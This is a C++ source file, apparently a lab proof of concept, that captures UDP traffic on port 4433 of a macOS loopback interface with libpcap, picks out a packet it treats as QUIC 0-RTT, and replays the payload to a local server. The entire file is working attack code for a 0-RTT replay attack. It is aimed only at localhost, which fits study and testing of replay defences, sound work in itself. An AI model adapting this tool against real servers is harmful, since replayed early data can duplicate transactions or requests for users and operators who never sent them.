// attacker.cpp
#include <pcap.h>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <iostream>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <sys/socket.h>
#include <unistd.h>

// Callback function that is called for each captured packet.
void packet_handler(u_char *user, const struct pcap_pkthdr *header, const u_char *packet) {
    // On macOS, the loopback (lo0) interface uses DLT_NULL.
    // The first 4 bytes indicate the protocol family, so we start after them.
    int offset = 4;

    // Get the IP header.
    struct ip *ip_hdr = (struct ip *)(packet + offset);
    int ip_header_length = ip_hdr->ip_hl * 4;

    // Get the UDP header.
    struct udphdr *udp_hdr = (struct udphdr *)(packet + offset + ip_header_length);
    const int udp_header_length = 8;

    // Calculate payload pointer and length.
    const u_char *udp_payload = packet + offset + ip_header_length + udp_header_length;
    int payload_length = ntohs(udp_hdr->uh_ulen) - udp_header_length;

    // Check for the 0-RTT packet type.
    if (payload_length > 0 && udp_payload[0] == 0x03) {
        std::cout << "Captured 0‑RTT packet, payload length: " << payload_length << std::endl;

        // Create a UDP socket to replay the packet.
        int sock_fd = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock_fd < 0) {
            std::cerr << "Failed to create UDP socket for replay" << std::endl;
            return;
        }

        // Set up the server address (localhost:4433).
        struct sockaddr_in server_addr;
        memset(&server_addr, 0, sizeof(server_addr));
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(4433);
        inet_pton(AF_INET, "127.0.0.1", &server_addr.sin_addr);

        // Replay the captured UDP payload to the server.
        ssize_t sent = sendto(sock_fd, udp_payload, payload_length, 0,
                              (struct sockaddr *)&server_addr, sizeof(server_addr));
        if (sent < 0) {
            std::cerr << "Failed to send replay packet" << std::endl;
        } else {
            std::cout << "Replayed 0‑RTT packet to server" << std::endl;
        }

        close(sock_fd);

        // Optionally, stop the capture after replaying one packet.
        exit(0);
    }
}

int main() {
    char errbuf[PCAP_ERRBUF_SIZE];
    
    // Open the loopback interface (lo0) for packet capture.
    // On macOS the loopback interface is usually "lo0".
    pcap_t *handle = pcap_open_live("lo0", BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        std::cerr << "Could not open interface lo0: " << errbuf << std::endl;
        return 2;
    }

    // Compile a filter expression to capture only UDP packets on port 4433.
    struct bpf_program filter;
    if (pcap_compile(handle, &filter, "udp port 4433", 0, PCAP_NETMASK_UNKNOWN) == -1) {
        std::cerr << "Error compiling filter: " << pcap_geterr(handle) << std::endl;
        return 2;
    }
    if (pcap_setfilter(handle, &filter) == -1) {
        std::cerr << "Error setting filter: " << pcap_geterr(handle) << std::endl;
        return 2;
    }

    std::cout << "Attacker running. Waiting for a 0‑RTT packet on UDP port 4433..." << std::endl;

    // Start the packet capture loop. This call will block until a matching packet is captured.
    pcap_loop(handle, 0, packet_handler, NULL);

    pcap_close(handle);
    return 0;
}
